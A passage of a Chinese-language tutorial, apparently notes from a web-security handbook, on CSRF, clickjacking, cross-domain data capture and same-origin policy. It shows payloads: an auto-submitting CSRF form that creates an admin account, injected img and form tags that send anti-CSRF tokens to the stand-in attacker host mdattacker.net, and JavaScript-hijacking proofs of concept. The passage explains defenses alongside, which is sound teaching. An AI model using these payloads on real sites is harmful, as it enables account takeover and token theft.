operator">=</span>letmein1</code></pre><p>此请求有3个主要特定使得它易于受到CSRF攻击：</p><ol><li>该请求执行特权操作(管理员请求创建用户)</li><li>应用程序仅仅依靠HTTP cookie来追踪会话。请求中任何其他位置均未传送会话相关的令牌</li><li>攻击者可以确定执行操作所需的所有参数。(除cookie中的会话令牌外，请求中不包含任何无法预测的值)</li></ol><p>针对这些缺陷，攻击者可以构建一个Web页面，向易受攻击的应用程序提出一个跨域请求，在其中包含执行特权操作所需的所有步骤。以下为这种攻击的一种示例：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://mdsec.net/auth/newUser.ashx"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"realname"</span> value<span class="token operator">=</span><span class="token string">"daf"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"username"</span> value<span class="token operator">=</span><span class="token string">"daf"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"userrole"</span> value<span class="token operator">=</span><span class="token string">"admin"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"password"</span> value<span class="token operator">=</span><span class="token string">"letmein1"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"confirmpassword"</span> value<span class="token operator">=</span><span class="token string">"letmein1"</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document.forms<span class="token punctuation">[</span>0<span class="token punctuation">]</span>.submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">>></span></code></pre><p>该攻击将所有请求参数放入隐藏表单字段，并包含一段自动提交表单的脚本。用户的浏览器提交该表单时，将自动添加用户的目标域的cookie，并且应用程序会正常处理生成的请求。如果管理用户登录到易受攻击的应用程序中，并访问攻击者的包含此表单的Web页面，该请求将在管理员的会话中处理，攻击者的账户因此得以创建。</p><h5 id="利用CSRF漏洞"><a href="#利用CSRF漏洞" class="headerlink" title="利用CSRF漏洞"></a>利用CSRF漏洞</h5><p>CSRF漏洞主要出现在应用程序仅依赖HTTP cookie追踪会话令牌的情况下，一旦已经在用户的浏览器中设定了cookie，浏览器会自动在随后的每个请求中将这个cookie提交给应用程序。无论请求是来自某个链接、应用程序本身中的表单或任何其地方(如外部网站或在电子邮件中单击的链接)，它都会这样做。如果应用程序未采取防范措施来阻止攻击者以这种方式“叠置”它的用户的会话，它就易于受到CSRF攻击。</p><h5 id="验证与CSRF"><a href="#验证与CSRF" class="headerlink" title="验证与CSRF"></a>验证与CSRF</h5><p>由于实施CSRF攻击需要在受害用户的会话中执行某种特权操作，因此，在实施攻击时，用户需要登录到应用程序中。</p><p>一个存在大量危险的CSRF漏洞的位置，是家庭DSL路由器使用的Web界面。这些设备大多包含敏感功能。由于这些设备通常并未采取防范CSRF的措施，并且大多数用户也没有修改设备的默认的IP地址，因此，它们容易受到由恶意外部站点传送的CSRF攻击。<br>如果设备的Web界面使用基于表单的验证，则可以通过首先让用户登录设备，然后执行经过验证的操作，从而实施两步攻击。由于大多数用户并未修改这类设备的默认证书(可能认为该Web界面只能通过内部家庭网络访问)，因此，攻击者的网页可以首先提出包含默认证书的登录请求。然后，设备会在用户的浏览器中设置一个会话令牌，随后的任何请求，包括由攻击者生成的请求，将自动传送该令牌。</p><p>在其他情况下，攻击者可能需要受害用户以攻击者自身的用户账户登录应用程序才能实施特定的攻击。一个允许用户上传并存储文件的应用程序为例。攻击者的网页可以提出一个CSRF请求，强制用户受害用户用攻击者的证书登录。然后，攻击者的网页可以提出另一个CSRF请求，以下载某个恶意文件。浏览器在处理该文件时，攻击者的XSS有效载荷将会执行，用户在易受攻击的应用程序中的会话将被攻破。虽然受害用户是使用攻击者的证书登录的，但是，XSS有效载荷可以在用户的浏览器中持续存在，并执行任意操作，因而可以让用户注销其在易受攻击的应用程序中的会话，并诱使其使用自己的证书登录。</p><h5 id="防止CSRF漏洞"><a href="#防止CSRF漏洞" class="headerlink" title="防止CSRF漏洞"></a>防止CSRF漏洞</h5><p>防范CSRF的标准方法是：将HTTP cookie与其他追踪令牌的方法相结合。这类方法通常采用其他通过HTTP隐藏表单字段传输的令牌。在每次提交请求时，应用程序除确认会话cookie外，还核实表单是否传送了正确的会话令牌。如果攻击者无法确定该令牌的值，就无法构建跨域请求。以这种方法使用反CSRF令牌时，必须为这些令牌提供与正常的会话令牌相同的保护。</p><blockquote><p>注：Referer消息头可以使用旧版Flash进行修改，或用元刷新标签(meta refresh tag)来伪装，所以不能依靠HTTP Referer消息头来判断请求是来自站内还是站外。</p></blockquote><h5 id="通过XSS突破反CSRF防御"><a href="#通过XSS突破反CSRF防御" class="headerlink" title="通过XSS突破反CSRF防御"></a>通过XSS突破反CSRF防御</h5><p>通常，在以下几种情况下，我们可以利用XSS漏洞突破反CSRF防御：</p><ul><li>如果受保护的功能中存在任何XSS漏洞，那么攻击者可以通过保存型XSS攻击注入的JavaScript直接读取脚本所在的应用程序响应中的令牌</li><li>如果应用程序仅对一部分通过验证的功能实施反CSRF防御，并且某项未防御CSRF的功能中存在一个反射型的XSS漏洞。例如，如果应用程序仅采用反CSRF令牌保护转账的的第二个步骤，那么攻击者就可以利用反射型XSS攻击从第一个步骤提出一个站内请求，截取令牌。再使用这个令牌进入第二个步骤。</li><li>在某些应用程序中，反CSRF令牌仅与当前用户关联，而不与用户的会话关联。首先，攻击者使用自己的账户登录，获得一个与他身份有关的有效反CSRF令牌，然后对登录表单实施CSRF攻击，迫使受害用户使用攻击者的证书登录。一旦用户作为攻击者登录，攻击者将使用CSRF使用户提出相关请求，对XSS漏洞加以利用，同时使用他自己的反CSRF令牌。然后，攻击者的XSS有效载荷将在用户的浏览器执行。由于用户仍然作为攻击者登录，XSS有效载荷可能需要使用户注销，然后诱使用户再度登录。最终，用户的登录证书和生成的应用程序会话都被完全攻破。</li><li>如果反CSRF令牌没有与用户关联，而是与用户会话关联，且攻击者可以通过某种方法在用户的浏览器中注入cookie，则只需对以上攻击稍作修改即可。这时，攻击者不是使用自己的证书针对登录表单实施CSRF攻击，而直接可以向用户传输他自己的会话令牌及与该会话关联的反CSRF令牌。然后，该攻击的剩余部分与之前所述的内容完全相同。</li></ul><h3 id="UI伪装"><a href="#UI伪装" class="headerlink" title="UI伪装"></a>UI伪装</h3><p>UI伪装也被称为“点击劫持(clickhacking)”“键击劫持(strokehacking)”。<br>在UI伪装攻击中，攻击者的网页会将目标应用程序加载到其页面上的iframe中，而实际上，攻击者会用其他界面覆盖目标程序中的界面。攻击者的界面中包含吸引用户并诱使其进行各种操作(如在页面的特定区域单击鼠标)的内容。用户执行这些操作时，虽然看起来其单击的是攻击者的界面中显示的按钮和其他UI元素，但他实际上是在不知情的情况下与攻击者所针对的目标应用程序进行交互。<br>这种攻击之所以能够在纯粹的CSRF攻击无法奏效的情况下取得成功，是因为应用程序使用的反CSRF令牌得到正确处理。虽然由于同源策略的原因，攻击者的页面无法读取该令牌的值，但是，攻击者的Iframe中的表单包含了由应用程序生成的令牌，在受害用户不知情的情况下单击“确认”按钮时，这个令牌被返交给应用程序。在应用程序看来，一切都很正常。</p><p>要实施欺骗，即让受害用户虽然看到一个界面，但实际上却与另一个界面交互，攻击者可以采用各种CSS技术。加载目标程序的iframe可以为任意大小，位于攻击者页面中的任何位置，并显示目标页面的任意位置。使用适当的样式属性。可以令iframe完全透明，从而使其对用户不可见。</p><h4 id="“破坏框架”防御"><a href="#“破坏框架”防御" class="headerlink" title="“破坏框架”防御"></a>“破坏框架”防御</h4><p>许多Web应用程序寻求采用一种称为破坏框架(framebusting)的技术来防范这类攻击。<br>破坏框架可以表现为各种形式，但基本上，它是指每个相关的应用程序页面都会运行一段脚本来检测自己是否被加载到iframe中。如果是，应用程序会尝试”破坏”该iframe，或执行其他防御性操作，如重定向到错误页面或拒绝显示应用程序自己的界面。</p><p>这些防御可以通过某种方式突破。下面我们通过一段“破坏框架”的代码来加以说明：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">if</span> <span class="token punctuation">(</span>top.location <span class="token operator">!=</span> self.location<span class="token punctuation">)</span><span class="token punctuation">{</span>    top.location <span class="token operator">=</span> self.location<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>这段代码检查页面本身的URL与浏览器窗口中的顶部框架的URL是否匹配。如果不匹配，则说明页面已经被加载到子框架内。在这种情况下，脚本会尝试将页面重新加载到窗口内的顶层框架中，从而“逃离”该框架。<br>实施UI伪装攻击的攻击者可以通过各种方法避开这种防御：</p><ul><li>由于攻击者的页面控制着顶层框架，因而可以重新定义<font color="#fb8c00">top.location</font>的含义，在子框架尝试引用它而导致的异常。例如，攻击者可以在IE浏览器中运行以下代码：<pre class=" language-bash"><code class="language-bash">var location<span class="token operator">=</span><span class="token string">'foo'</span><span class="token punctuation">;</span></code></pre>这段代码将location重新定义为顶层框架中的本地变量，在子框架运行的代码无法访问该变量。</li><li>顶层框架可能会钩住<font color="#fb8c00">window.onbeforeunload</font>事件，从而在“破坏框架”代码尝试设置顶层框架的位置时运行攻击者的事件处理程序。这时，攻击者的代码可以对返回的HTTP 204(无内容)响应的URL执行进一步的重定向。这会导致浏览器取消重定向调用链，使顶层框架的URL保持不变。</li><li>顶层框架可以在目标应用程序加载到子框架中时定义<font color="#fb8c00">sandbox</font>属性，这会在子框架中禁用脚本，同时将cookie保持为启用状态。</li><li>顶层框架可以利用IE XSS过滤器在子框架中选择性地禁用“破坏框架”脚本。当攻击者的页面指定iframe目标URL时，可以创建一个参数，在参数值中包含一段适合的“破坏框架”脚本。IE XSS过滤器将识别该参数值及目标程序返回的响应中的脚本代码，并禁用响应中的脚本(即“破坏框架”脚本)，设法为用户提供“保护”。</li></ul><h5 id="防止UI伪装"><a href="#防止UI伪装" class="headerlink" title="防止UI伪装"></a>防止UI伪装</h5><p>要防止攻击者将应用程序页面嵌入框架，一种更可靠的方法是使用<font color="#fb8c00">X-Frame-Options</font>响应消息头。<font color="#fb8c00">X-Frame-Options</font>指示浏览器防止页面被嵌入框架，值sameorigin指示浏览器防止第三方域执行“嵌入框架”操作。</p><h2 id="跨域捕获数据"><a href="#跨域捕获数据" class="headerlink" title="跨域捕获数据"></a>跨域捕获数据</h2><p>同源策略旨在防止在同一个域中运行的代码访问由其他域提供的内容。因此，跨站点请求伪造攻击通常被称为“单向”攻击。虽然一个域可以向另一个域提出请求，但它很难读取这些域的响应，从而从其他域中窃取用户数据。<br>有各种攻击技巧可用于从其他域中捕获整个或部分响应。</p><h3 id="通过注入HTML捕获数据"><a href="#通过注入HTML捕获数据" class="headerlink" title="通过注入HTML捕获数据"></a>通过注入HTML捕获数据</h3><p>与利用XSS漏洞不同，攻击者可以利用许多应用程序提供的功能，在其他用户收到的响应中注入一段有效的HTML。例如，Web邮件可能会显示包含某个HTML标记的电子邮件。但会阻止可用于执行脚本代码的任何标签和属性。或者，动态生成的错误消息可能会过滤一系列表达式，但仍然允许有限使用HTML。<br>在这些情况下，就可以利用HTML注入条件向攻击者所在的域发送页面中的敏感数据。</p><p>以一个允许攻击者在以下响应中注入有限的HTML的Web邮件应用程序为例：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>limited HTML injection here<span class="token punctuation">]</span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://wahh-mail.com/forwardmail"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"nonce"</span> value<span class="token operator">=</span><span class="token string">"123"</span><span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Forward"</span><span class="token operator">></span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">&lt;</span>/form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>var statsTrackerId<span class="token operator">=</span><span class="token string">'AAE78F27CB3210D'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>在注入点之后，页面包含了一个提供CSRF令牌的HTML表单。在这种情况下，可以在上述响应中注入以下文本：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span>'http://mdattacker.net/capture?html<span class="token operator">=</span></code></pre><p>这段HTML将打开一个指向攻击者域中的URL的图像标签。该URL包含在单引号内，但URL字符串并未终止，&lt; img&gt;标签也没有结束。这会导致浏览器将注入点之后的文本视为URL的一部分，直到遇到单引号，也就是响应中随后出现引用的JavaScript字符串的位置。浏览器接受各种插入字符，也允许URL跨越多行。<br>用户浏览器在处理攻击者注入的响应时，它会尝试提取指定的图像，并向以下URL提出请求，从而向攻击者的域中发送敏感的反CSRF令牌：</p><pre class=" language-bash"><code class="language-bash">http://mdattacker.net/capture?html<span class="token operator">=</span><span class="token operator">&lt;</span>form%20action<span class="token operator">=</span><span class="token string">"http://wahh-mail.com/forwardmail"</span>%20method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span><span class="token operator">&lt;</span>input%20type<span class="token operator">=</span><span class="token string">"hidden"</span>%20name<span class="token operator">=</span><span class="token string">"nonce"</span>%20value<span class="token operator">=</span><span class="token string">"123"</span><span class="token operator">></span><span class="token operator">&lt;</span>input%20type<span class="token operator">=</span><span class="token string">"submit"</span>%20value<span class="token operator">=</span><span class="token string">"Forward"</span><span class="token operator">></span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">&lt;</span>/form<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>var statsTrackerId<span class="token operator">=</span></code></pre><p>另一个攻击可以注入以下文本：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"http://mdattacker.net/capture"</span> method<span class="token operator">=</span><span class="token string">"POST"</span><span class="token operator">></span></code></pre><p>此攻击在应用程序本身使用的&lt; form&gt;标签之前注入一个指定攻击者域的&lt; form&gt;标签。在这种情况下，浏览器在遇到嵌入的&lt; form&gt;标签时，它们将忽略该标签，在遇到第一个&lt; form&gt;标签的情况下处理表单。因此，如果用户提交表单，表单中的所有参数，包括敏感的反CSRF令牌，也会被提交到攻击者的服务器中：</p><pre class=" language-bash"><code class="language-bash">POST /capture HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 192Host: mdsec.netnonce<span class="token operator">=</span>123<span class="token operator">&amp;</span><span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre><p>由于第二个攻击仅注入了格式正常的HTML，因此能够有效避开那些旨在允许回显的输入中的HTML子集的过滤</p><h3 id="通过注入CSS捕获数据"><a href="#通过注入CSS捕获数据" class="headerlink" title="通过注入CSS捕获数据"></a>通过注入CSS捕获数据</h3><p>许多时候，应用程序会阻止或对注入的输入中的&lt;、&gt;字符进行编码，防止攻击者插入任何新的HTML标签。Web应用程序中大多存在此类纯文本注入条件。例如，在一个Web邮件应用程序中，攻击者可以通过电子邮件主题行在目标用户的响应中注入有限的文本。在这种情况下，攻击者可以通过在应用程序中注入CSS来捕获敏感数据。</p><p>在上述HTML的示例中，假设攻击者发送以下主题行的电子邮件：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token punctuation">}</span>*<span class="token punctuation">{</span>font-family:'</code></pre><p>其中不包含任何HTML元字符，大多数用户都接受并在收件人用户的响应中显示这段代码。这时，返回给用户的响应可能与以下内容相似：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token punctuation">{</span><span class="token punctuation">}</span>*<span class="token punctuation">{</span>font-family:<span class="token string">'&lt;/td>&lt;form action="http://wahh-mail.com/forwardmail" method="POST">&lt;input type="hidden" name="nonce" value="123">&lt;input type="submit" value="Forward">....&lt;/form>&lt;script>var statsTrackerId='</span>AAE78F27CB3210D'<span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>很明显，此响应中包含HTML。但奇怪的是，浏览器将该响应加载为CSS样式表，能正常处理其中包含的任何CSS定义。在这段代码中，注入的响应定义了CSS font-family属性，并将一个引用的字符串作为属性定义，攻击者注入的文本并未终止该字符串，因此，该字符串会一直持续到响应的剩余部分，包括包含敏感的反CSRF令牌的隐藏字段。</p><p>要利用这种行为，攻击者需要在自己的域中创建一个页面，在其中包含CSS样式表形式的注入响应。这会在攻击者自己的页面中应用任何嵌入的CSS定义。然后，攻击者可以使用JavaScript来查询这些定义，从而检索捕获到的数据</p><h3 id="JavaScript劫持"><a href="#JavaScript劫持" class="headerlink" title="JavaScript劫持"></a>JavaScript劫持</h3><p>JavaScript劫持提供了另一种跨域数据捕获的方法，从而将CSRF转化为一种有限的“双向”攻击。同源策略允许一个域包含其他域的脚本代码，并可以在调用域(而不是发布域)中运行。今天的许多应用程序都用JavaScript来传输敏感数据。接下来我们将介绍各种使用动态执行的脚本代码来传输敏感数据的方法，以及如何劫持这类代码，以捕获域中的数据。</p><h4 id="函数回调"><a href="#函数回调" class="headerlink" title="函数回调"></a>函数回调</h4><p>以一个应用程序为例，它在当前用户单击相应的选项卡时，在用户界面中显示该用户的个人信息。为提供无缝的用户体验，应用程序使用异步请求提取用户信息。当用户单击“个人资源”选项卡时，某段客户端代码将动态包含以下脚本：</p><pre class=" language-bash"><code class="language-bash">https://mdsec.net/YourDetailsJson.ashx</code></pre><p>针对此URL的响应包含一个函数回调，该函数在UI中显示用户资料。</p><pre class=" language-bash"><code class="language-bash">showUserInfo<span class="token punctuation">(</span>    <span class="token punctuation">[</span>       <span class="token punctuation">[</span><span class="token string">'Name'</span>,<span class="token string">'Alice'</span><span class="token punctuation">]</span>,       <span class="token punctuation">[</span><span class="token string">'Username'</span>,<span class="token string">'tree'</span><span class="token punctuation">]</span>,       <span class="token punctuation">[</span><span class="token string">'Password'</span>,<span class="token string">'123'</span><span class="token punctuation">]</span>,       <span class="token punctuation">[</span><span class="token string">'Uid'</span>,<span class="token string">'11'</span><span class="token punctuation">]</span>,       <span class="token punctuation">[</span><span class="token string">'Role'</span>,<span class="token string">'User'</span><span class="token punctuation">]</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在这种情况下，攻击者可以创建一个showUserInfo函数的页面，并在其中包含传送个人信息的脚本。从而捕获用户资源，一个简单的概念验证攻击如下所示：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">function</span> showUserInfo<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>alert<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  //用户个人资料<span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://mdsec.net/YourDetailsJson.ashx"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>如果用户在访问攻击者页面的同时，还登录了某个易受攻击的应用程序，则攻击者的页面将动态地插入包含用户个人信息的脚本</p><h4 id="变量分配"><a href="#变量分配" class="headerlink" title="变量分配"></a>变量分配</h4><p>以一个社交网络应用程序为例，一部分用户界面使用动态生成的脚本加载，为防止标准的CSRF攻击，这些脚本中包含了反CSRF令牌。利用在动态脚本中插入这些令牌导致的漏洞，攻击者可以通过跨域包含相关脚本来捕获令牌。<br>例如，假设wahh-network.com上的应用程序返回包含以下代码的脚本：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">..</span>.var nonce<span class="token operator">=</span><span class="token string">'123456789'</span><span class="token punctuation">;</span><span class="token punctuation">..</span>.</code></pre><p>一个用于跨域捕获nonce值的简单概念验证机制如下所示：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://wahh-network.com/status"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>nonce<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><h4 id="E4X"><a href="#E4X" class="headerlink" title="E4X"></a>E4X</h4><p>E4X是对ECMAScript语言(包括JavaScript)的扩展，后者可为XML语言添加本地支持。<br>除了允许在JavaScript中直接使用XML语法外，用户还可以在E4X中嵌入代码，以调用XML中的JavaScript</p><pre class=" language-bash"><code class="language-bash">var foo<span class="token operator">=</span><span class="token operator">&lt;</span>bar<span class="token operator">></span><span class="token punctuation">{</span>prompt<span class="token punctuation">(</span><span class="token string">'Please enter the value of bar.'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>/bar<span class="token operator">></span><span class="token punctuation">;</span></code></pre><p>E4X的这些特性导致了两个严重的后果，可用于实施跨域捕获攻击：</p><ul><li>结构正确的XML标记将被视为不会分配给任何变量的值</li><li>嵌入{….}块中的文本将作为JavaScript执行，用于对XML数据的相关部分进行初始化。<br>利用与之前所述的CSS注入攻击类似的技巧，攻击者有时可以在目标应用程序的HTML响应中的适当位置注入文本，在该响应中的敏感数据周围插入任意的{…}块。然后，攻击者可以跨域包含整个响应，将其作为脚本执行，以捕获其中的数据。</li></ul><h4 id="防止JavaScript劫持"><a href="#防止JavaScript劫持" class="headerlink" title="防止JavaScript劫持"></a>防止JavaScript劫持</h4><p>防止JavaScript攻击的多种防范措施：</p><ul><li>对于执行敏感操作的请求，应用程序应使用标准的反CSRF防御来阻止跨域请求返回任何包含敏感数据的响应。</li><li>当应用程序从它自己的域中动态执行JavaScript代码时，并不仅限于使用&lt; script&gt;标签来包含脚本。因为请求为本站请求，客户端代码可以使用XMLHttpRequest检索原始响应并进行其他处理，然后再将其作为脚本执行。这意味着，客户端应用程序在处理脚本之前，将会删除无效或有问题的JavaScript。</li><li>由于应用程序可以使用XMLHttpRequest检索动态脚本，因此它也可以使用POST请求完成这个任务。如果应用程序仅接受使用POST请求访问可能易受攻击的脚本代码，他就能够阻止第三方站点将它们包含在&lt; script&gt;标签内。</li></ul><h2 id="同源策略深入讨论"><a href="#同源策略深入讨论" class="headerlink" title="同源策略深入讨论"></a>同源策略深入讨论</h2><h3 id="同源策略与浏览器扩展"><a href="#同源策略与浏览器扩展" class="headerlink" title="同源策略与浏览器扩展"></a>同源策略与浏览器扩展</h3><p>各种浏览器扩展技术全都在域之间实施了某种隔离，这种隔离的实施方式与主要的浏览器同源策略所采用的基本原则相同。但是，每种实施方式的一些特点在某些情况下可能会导致跨域攻击。</p><h4 id="同源策略与Flash"><a href="#同源策略与Flash" class="headerlink" title="同源策略与Flash"></a>同源策略与Flash</h4><ul><li>Flash对象的来源由加载这些对象的URL所在的域决定，而不是由加载这些对象的HTML页面的URL决定。和浏览器中的同源策略一样，默认情况下，将基于协议、主机名和端口号实施隔离。</li><li>除与同一来源进行完全交互双向交互外，Flash对象还可以通过浏览器使用URLRequest API提出的跨域请求。如能够指定任意的<font color="#fb8c00">Content-Type</font>消息头以及在POST请求主体中发送任何内容，但将会对这些请求运用浏览器cookie,默认情况下，提出这些请求的Flash对象并不能读取对跨域请求做出的响应。</li><li>Flash提供了一种机制，各种域可通过这种机制向来自其他域的Flash对象授予权限，以便于这些对象能与它们进行完全双向的交互。通常，授予权限的域会在URL/crossdomain.xml处发布一个策略文件，从而完成这一任务。当某个Flash对象尝试提出双向跨域请求时，Flash浏览器扩展将检索所请求的域中的策略文件，并仅在所请求的域授权对提出请求的域的访问权限时，才允许上述请求。</li></ul><p>由<a href="http://www.adobe.com" target="_blank" rel="noopener">www.adobe.com</a> 发布的Flash策略如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span>cross-domain-policy<span class="token operator">></span>    <span class="token operator">&lt;</span>site-control permitted-cross-domain-policies<span class="token operator">=</span><span class="token string">"by-content-type"</span>/<span class="token operator">></span>    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.macromedia.com"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.adobe.com"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.photoshop.com"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>allow-access-from domain<span class="token operator">=</span><span class="token string">"*.acrobat.com"</span> /<span class="token operator">></span> <span class="token operator">&lt;</span>/cross-domain-policy<span class="token operator">></span></code></pre><h4 id="同源策略和Silverlight"><a href="#同源策略和Silverlight" class="headerlink" title="同源策略和Silverlight"></a>同源策略和Silverlight</h4><ul><li>用于Silverlight的同源策略很大程度基于由Flash实施的策略。</li><li>Silverlight和Flash的一个重要区别在于，Silverlight不会基于协议或端口隔离来源，因此通过HTTP加载的对象可以与同一个域上的HTTPS URL交互。</li><li>Silverlight使用自己的跨域策略文件，地址为/clientaccesspolicy.xml。</li></ul><p>由<a href="http://www.microsoft.com" target="_blank" rel="noopener">www.microsoft.com</a> 发布的Silverlight同源策略如下所示：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">></span><span class="token operator">&lt;</span>access-policy<span class="token operator">></span>   <span class="token operator">&lt;</span>cross-domain-access<span class="token operator">></span>     <span class="token operator">&lt;</span>policy<span class="token operator">></span>      <span class="token operator">&lt;</span>allow-from<span class="token operator">></span>      <span class="token operator">&lt;</span>domain uri<span class="token operator">=</span><span class="token string">"http://www.microsoft.com"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>domain uri<span class="token operator">=</span><span class="token string">"http://i.microsoft.com"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>domain uri<span class="token operator">=</span><span class="token string">"http://i2.microsoft.com"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>/allow-from<span class="token operator">></span>      <span class="token operator">&lt;</span>grant-to<span class="token operator">></span>       <span class="token operator">&lt;</span>resource path<span class="token operator">=</span><span class="token string">"/"</span> include-subpaths<span class="token operator">=</span><span class="token string">"true"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>/grant-to<span class="token operator">></span>     <span class="token operator">&lt;</span>/policy<span class="token operator">></span>    <span class="token operator">&lt;</span>/cross-domain-access<span class="token operator">></span><span class="token operator">&lt;</span>/access-policy<span class="token operator">></span></code></pre><h4 id="同源策略与Java"><a href="#同源策略与Java" class="headerlink" title="同源策略与Java"></a>同源策略与Java</h4><p>Java同源策略的一个重要不同在于：某些情况下，与来源域共享的IP地址的其他域将被视为“同源”</p><h3 id="同源策略与HTML5"><a href="#同源策略与HTML5" class="headerlink" title="同源策略与HTML5"></a>同源策略与HTML5</h3><p>在HTML5中，可以与其他域进行双向交互，前提是被访问的域为交互提供权限。<br>跨域交互的权限通过一系列新的HTTP消息头来实现，如果某个脚本尝试使用XMLHttpRequest提出跨域请求，处理该请求的方式因请求的具体内容而异：</p><ul><li>对于常规的请求，即可使用现有的HTML结构跨域生成的请求，浏览器将提出请求，并检查生成的响应消息头，以确定是否应允许调用脚本访问该请求的响应。</li><li>其他无法使用现有的HTML生成的请求，如那些非标准HTTP方法或Content-Type、或添加了定制HTTP消息头的请求，将进行不同的处理。浏览器会首先向目标URL提出一个OPTIONS请求，然后检查响应的消息头，以确定是否应允许那些请求。</li></ul><p>在两种情况下，浏览器都会添加一个Origin消息头，用于指示尝试提出跨域请求的域。</p><pre class=" language-bash"><code class="language-bash">Origin: http://wahh-app.com</code></pre><p>要确定可能执行双向交互的域，服务器的响应中应包含<font color="#fb8c00">Access-Control-Allow-Origin</font>&gt;消息头，其中包含以逗号分隔的允许的域列表和通配符。</p><pre class=" language-bash"><code class="language-bash">Access-Control-Allow-Origin: *</code></pre><p>在第二种情况下，如果已使用POTIONS请求预先验证了跨域请求，则可以使用以下消息头来指示尝试提出的请求的具体内容：</p><pre class=" language-bash"><code class="language-bash">Access-Control-Request-Method: PUTAccess-Control-Request-Headers: X-PINGOTHER</code></pre><h2 id="其他客户端注入攻击"><a href="#其他客户端注入攻击" class="headerlink" title="其他客户端注入攻击"></a>其他客户端注入攻击</h2><h3 id="HTTP消息头注入"><a href="#HTTP消息头注入" class="headerlink" title="HTTP消息头注入"></a>HTTP消息头注入</h3><p>如果攻击者能够在他控制的消息头中注入换行符，他就能在响应中插入其他HTTP消息头、并在响应主体中写入任意内容。这种漏洞最常见于<font color="#fb8c00">Location和Set-Cookie</font>消息头中</p><p>同样，一些应用程序提取用户提交的输入，并将其插入到cookie值中：</p><pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token 